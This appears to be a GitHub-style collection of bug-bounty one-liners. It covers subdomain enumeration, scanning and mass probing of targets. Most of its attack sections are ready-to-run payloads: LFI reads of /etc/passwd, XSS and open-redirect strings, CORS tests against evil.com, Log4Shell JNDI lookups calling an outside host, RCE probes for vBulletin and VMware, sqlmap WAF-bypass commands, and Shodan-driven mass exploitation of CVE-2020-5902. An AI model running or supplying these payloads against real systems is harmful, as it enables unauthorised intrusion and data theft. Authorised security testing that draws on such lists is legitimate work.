> @pikpikcu
> 

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

```

### **Get Subdomains from JLDC**

> @pikpikcu
> 

```bash
curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

```

### **Get Subdomains from securitytrails**

> @pikpikcu
> 

```bash
curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u

```

### **Bruteforcing Subdomain using DNS Over**

> @pikpikcu
> 

```
while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt

```

### **Get Subdomains With sonar.omnisint.io**

> @pikpikcu
> 

```
curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u

```

### **Get Subdomains With synapsint.com**

> @pikpikcu
> 

```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u

```

### **Get Subdomains from crt.sh**

> @vict0ni
> 

```bash
curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

```

### **Sort & Tested Domains from Recon.dev**

> @stokfedrik
> 

```bash
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent

```

### **Subdomain Bruteforcer with FFUF**

> @GochaOqradze
> 

```bash
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'

```

### **Find Allocated IP Ranges for ASN from IP Address**

> wains.be
> 

```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n

```

### **Extract IPs from a File**

> @emenalf
> 

```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt

```

### **Ports Scan without CloudFlare**

> @dwisiswant0
> 

```bash
subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe

```

### **Create Custom Wordlists**

> @tomnomnom
> 

```bash
gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt

```

```bash
cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt

```

### **Extracts Juicy Informations**

> @Prial Islam Khan
> 

```bash
for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done

```

### **Find Subdomains TakeOver**

> @hahwul
> 

```bash
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ;

```

### **Dump Custom URLs from ParamSpider**

> @hahwul
> 

```bash
cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;

```

### **URLs Probing with cURL + Parallel**

> @akita_zen
> 

```bash
cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk

```

### **Dump In-scope Assets from `chaos-bugbounty-list`**

> @dwisiswant0
> 

```bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'

```

### **Dump In-scope Assets from `bounty-targets-data`**

> @dwisiswant0
> 

### **HackerOne Programs**

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'

```

### **BugCrowd Programs**

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

```

### **Intigriti Programs**

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'

```

### **YesWeHack Programs**

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

```

### **HackenProof Programs**

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'

```

### **Federacy Programs**

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

```

### **Dump URLs from sitemap.xml**

> @healthyoutlet
> 

```bash
curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'

```

### **Pure Bash Linkfinder**

> @ntrzz
> 

```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt

```

### **Extract Endpoints from swagger.json**

> @zer0pwn
> 

```bash
curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'

```

### **CORS Misconfiguration**

> @manas_hunter
> 

```bash
site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done

```

### **Find Hidden Servers and/or Admin Panels**

> @rez0__
> 

```bash
ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt

```

### **Recon Using api.recon.dev**

> @z0idsec
> 

```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain

```

### **Find Live Host/Domain/Assets**

> @YashGoti
> 

```bash
subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u

```

### **XSS without gf**

> @HacktifyS
> 

```bash
waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done

```

### **Get Subdomains from IPs**

> @laughface809
> 

```bash
python3 hosthunter.py HOSTS.txt > OUT.txt

```

### **Gather Domains from Content-Security-Policy**

> @geeknik
> 

```bash
curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u

```

### **Nmap IP:PORT Parser Piped to HTTPX**

> @dwisiswant0
> 

```bash
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
```

# **One-Liners**

![https://awesome.re/badge-flat2.svg](https://awesome.re/badge-flat2.svg)

### **Thanks to all who create these Awesome One Liners❤️**

---

## 

![https://user-images.githubusercontent.com/75373225/180003557-59bf909e-95e5-4b31-b4f8-fc05532f9f7c.png](https://user-images.githubusercontent.com/75373225/180003557-59bf909e-95e5-4b31-b4f8-fc05532f9f7c.png)

## **One Line recon using pd tools**

```
subfinder -d redacted.com -all | anew subs.txt; shuffledns -d redacted.com -r resolvers.txt -w n0kovo_subdomains_huge.txt | anew subs.txt; dnsx -l subs.txt -r resolvers.txt | anew resolved.txt; naabu -l resolved.txt -nmap -rate 5000 | anew ports.txt; httpx -l ports .txt | anew alive.txt; katana -list alive.txt -kf all -jc | anew urls.txt; nuclei -l urls.txt -es info, unknown -ept ssl -ss template-spray | anew nuclei.txt

```

# **Subdomain Enumeration**

**Juicy Subdomains**

```
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'

```

**from BufferOver.run**

```
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u

```

**from Riddler.io**

```
curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

```

**from RedHunt Labs Recon API**

```
curl --request GET --url 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=<target.com>&page_size=1000' --header 'X-BLOBR-KEY: API_KEY' | jq '.subdomains[]' -r

```

**from nmap**

```
nmap --script hostmap-crtsh.nse target.com

```

**from CertSpotter**

```
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

```

**from Archive**

```
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

```

**from JLDC**

```
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

```

**from crt.sh**

```
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

```

**from ThreatMiner**

```
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u

```

**from Anubis**

```
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"

```

**from ThreatCrowd**

```
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"

```

**from HackerTarget**

```
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

```

**from AlienVault**

```
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url_list?limit=100&page=1" | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u

```

***SubDomain Bruteforcing - ffuf***

```
ffuf -u https://FUZZ.target.com -w dns.txt -v | grep "| URL |" | awk '{print $4}'

```

---

## **Subdomain Takeover:**

```
cat subs.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe

```

---

## **LFI:**

```
cat hosts | gau |  gf lfi |  httpx  -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"

```

```
waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

```

```
cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n";done

```

---

## **Open Redirect:**

```
waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done

```

```
cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'

```

---

## **SSRF:**

```
cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'

```

```
cat wayback.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf -c -w ssrf.txt -u FUZZ

```

---

## **XSS:**

```
cat domains.txt | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"

```

```
gau target.com grep '='| qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'

```

```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert("

```

```
cat targets.txt | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe

```

```
waybackurls target.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

```

```
cat urls.txt | grep "=" | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht

```

```
cat targets.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)"

```

```
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'

```

---

## **Hidden Dirs:**

```
dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt

```

```
ffuf -c -w urls.txt:FUZZ1 -w wordlist.txt:FUZZ2 -u FUZZ1/FUZZ2 -mc 200 -ac -recursion -v -of json -o output

```

## **ffuf json to txt output**

```
cat output.json | jq | grep -o '"url": ".*"' | grep -o 'https://[^"]*'

```

**Search for Sensitive files from Wayback**

```
waybackurls domain.com| grep - -color -E "1.xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"

```

```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200

```

---

## **SQLi:**

```
cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 5 --risk 3

```

***Bypass WAF using TOR***

```
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor

```

---

## **CORS:**

```
gau "http://target.com" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done

```

---

## **Prototype Pollution:**

```
subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

```

---

## **CVEs:**

### **CVE-2020-5902:**

```
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

```

### **CVE-2020-3452:**

```
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt

```

### **CVE-2021-44228:**

```
cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done

```

```
cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt

```

### **CVE-2022-0378:**

```
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done

```

### **CVE-2022-22954:**

```
cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}”| grep "context" && echo "$h\033[0;31mV\n"|| echo "$h \033[0;32mN\n";done

```

### **CVE-2022-41040:**

```
ffuf -w "urls.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r

```

---

## **RCE:**

```
cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent

```

### **vBulletin 5.6.2**

```
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;

```

```
subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080

```

---

## **JS Files:**

### **Find JS Files:**

```
gau --subs target.com |grep -iE '.js'|grep -iEv '(.jsp|.json)' >> js.txt

```

```
assetfinder target.com | waybackurls | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"

```

### **Hidden Params in JS:**

```
cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort | httpx -silent -threads 2000 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done

```

### **Extract sensitive end-point in JS:**

```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

```

---

### **SSTI:**

```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done

```

---

## **HeartBleed**

```
cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line; safe; done

```

---

## **Scan IPs**

```
cat my_ips.txt | xargs -L100 shodan scan submit --wait 0

```

## **Portscan**

```
naabu -l targets.txt -rate 3000 -retries 3 -warm-up-time 0 -rate 150 -c 50 -ports 1-65535 -silent -o out.txt

```

## **Screenshots using Nuclei**

```
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v

```

## **IPs from CIDR**

```
echo cidr | httpx -t 100 | nuclei -t ~/nuclei-templates/ssl/ssl-dns-names.yaml | cut -d " " -f7 | cut -d "]" -f1 |  sed 's/[//' | sed 's/,/\n/g' | sort -u

```

## **SQLmap Tamper Scripts - WAF bypass**

```
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 --no-cast --no-escape --dbs --random-agent

```

## **Shodan Cli**

```
shodan search Ssl.cert.subject.CN:"target.com" --field ip_str | httpx -silent | tee ips.txt

```

### **ffuf txt output**

```
ffuf -w wordlists.txt -u URL/FUZZ -r -ac -v &>> output.txt ; sed -i 's/\:\: Progress.*Errors.*\:\://g' output.txt ; sed -i 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' output.txt

```

### **Ffuf json to only url**

```
cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'

```

## **Recon Oneliner from Stok**

```
subfinder -d moonpay.com -silent | anew moonpay-subs.txt | dnsx -resp -silent | anew moonpay-alive-subs-ip.txt | awk '{print $1}' | anew moonpay-alive-subs.txt | naabu -top-ports 1000 -silent | anew moonpay-openports.txt | cut -d ":" -f1 | naabu -passive -silent | anew moonpay-openports.txt | httpx -silent -title -status-code -mc 200,403,400,500 | anew moonpay-web-alive.txt | awk '{print $1}' | gospider -t 10 -q -o moonpaycrawl | anew moonpay-crawled.txt | unfurl format %s://dtp | httpx -silent -title -status-code -mc 403,400,500 | anew moonpay-crawled-interesting.txt | awk '{print $1}' | gau --blacklist eot,svg,woff,ttf,png,jpg,gif,otf,bmp,pdf,mp3,mp4,mov --subs | anew moonpay-gau.txt | httpx -silent -title -status-code -mc 200,403,400,500 | anew moonpay-web-alive.txt | awk '{print $1}'| nuclei -eid expired-ssl,tls-version,ssl-issuer,deprecated-tls,revoked-ssl-certificate,self-signed-ssl,kubernetes-fake-certificate,ssl-dns-names,weak-cipher-suites,mismatched-ssl-certificate,untrusted-root-certificate,metasploit-c2,openssl-detect,default-ssltls-test-page,wordpress-really-simple-ssl,wordpress-ssl-insecure-content-fixer,cname-fingerprint,mx-fingerprint,txt-fingerprint,http-missing-security-headers,nameserver-fingerprint,caa-fingerprint,ptr-fingerprint,wildcard-postmessage,symfony-fosjrouting-bundle,exposed-sharepoint-list,CVE-2022-1595,CVE-2017-5487,weak-cipher-suites,unauthenticated-varnish-cache-purge,dwr-index-detect,sitecore-debug-page,python-metrics,kubernetes-metrics,loqate-api-key,kube-state-metrics,postgres-exporter-metrics,CVE-2000-0114,node-exporter-metrics,kube-state-metrics,prometheus-log,express-stack-trace,apache-filename-enum,debug-vars,elasticsearch,springboot-loggers -ss template-spray | notify -silent

```

## **Update golang**

```
curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh|sudo bash

```

## **Censys CLI**

```
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'

```

## **Nmap cidr to ips.txt**

```
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'

```

### **Xray urls scan**

```
for i in $(cat subs.txt); do ./xray_linux_amd64 ws --basic-crawler $i --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal --ho $(date +"%T").html ; done

```

---

## **Support Me**

![https://cdn.buymeacoffee.com/buttons/default-orange.png](https://cdn.buymeacoffee.com/buttons/default-orange.png)